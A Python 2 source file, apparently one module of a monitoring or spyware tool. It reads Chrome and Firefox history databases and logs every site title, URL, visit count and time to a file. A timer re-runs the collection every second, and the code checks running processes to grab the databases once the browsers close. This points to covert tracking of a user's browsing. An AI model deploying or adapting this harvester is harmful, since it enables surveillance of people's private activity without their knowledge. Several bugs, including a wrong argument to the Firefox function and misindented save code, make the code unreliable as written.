#!/usr/bin/env python

# All of the program settings are definced in Settings.py
from modules.Settings import *
from modules.paths import *


def save_browser_logs(logs, file_name):

    """This function saves the logs  from browser
        a text file"""
    
    global folder_path

    # if the folder does not exist, create one
    if not os.path.exists(folder_path):
          os.mkdir(folder_path)

    # write to the file                       
    output_file = io.open(file_name,"a+", encoding='utf8')
    output_file.write(unicode(logs))
    output_file.close()


def chrome_history(history_db):

    # Connect to the Database
    connect_db = sqlite3.connect(history_db)

    # access data using cursor
    access_db = connect_db.cursor()

    # select specific field from the the database
    db = access_db.execute('select url, title, visit_count, last_visit_time from urls')

    save_browser_logs(("Chrome History"+ "\n\n"), browser_file)
    for row in db:
        row = list(row)
        urls = row[0]  # returns website urls
        website_titles = row[1] # returns the website titles
        visit_counts = row[2]   # returns number of the visits per website
        visit_time = row[3]   # last time the user accessed the page
    
        if website_titles == "" :
            print " "

        else:
            # save into history file
            save_browser_logs(("Website Title: " +website_titles + "\n"), browser_file)
            save_browser_logs(("URL: " + urls + "\n"), browser_file)
            save_browser_logs(("Visit Counts: " + str(visit_counts) + "\n"), browser_file)
            save_browser_logs(("Visit Time: " + str(visit_time) + "\n"), browser_file)
            save_browser_logs(("\n\n"), browser_file)


def firefox_history(browser_path):

    """This function gets FireFox history"""

    global base_path

    if browser_path == 'firefox':

        browser_db = base_path + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
        profiles = [i for i in os.listdir(browser_db) if i.endswith('.default')]

        for n in profiles:
            #print
            pass

        # Connect to the Database
        connect_db = sqlite3.connect(browser_db + n + "//places.sqlite")
        
        # access data using cursor
        access_db = connect_db.cursor()

        # select specific field from the the database
        db = access_db.execute('SELECT url,title, last_visit_date FROM moz_places')

        # loop through the db
        save_browser_logs(("FireFox History\n\n"), browser_file)
        for row in db:
            row = list(row)
            urls = row[0]          # returns website urls
            website_title = row[1] # returns website titles

            # return user visit time of the websites
            if row[2] == None:
                pass
            else:
                visit_time = datetime.fromtimestamp(row[2]/1000000).strftime('%Y-%m-%d %H:%M:%S')

            # save to the file
                save_browser_logs(("Website Title: " + unicode(website_title) + "\n"), browser_file)
                save_browser_logs(("URL: " + urls + "\n"), browser_file)
                save_browser_logs(("Visit Time: " + str(visit_time) + "\n"), browser_file)
                save_browser_logs(("\n\n"), browser_file)


def get_all_history():

    """This function get browser history from
        Chrome, FireFox, InternetExplore"""

    threading.Timer(1, get_all_history).start()
    
    current_programs = []

    # In order to retreive the history, we need to make sure the
    # browser is NOT running

    # retreieve the current running programs, and add them to the list
    for process in psutil.process_iter():

        current_programs.append(process.name())
    
    
    for i in current_programs:

        # if Chrome was running, break, else get the history
        if not 'chrome.exe' in current_programs :
            chrome_history(history_db)
            
        elif not 'firefox.exe' in current_programs:
            firefox_history(history_db)



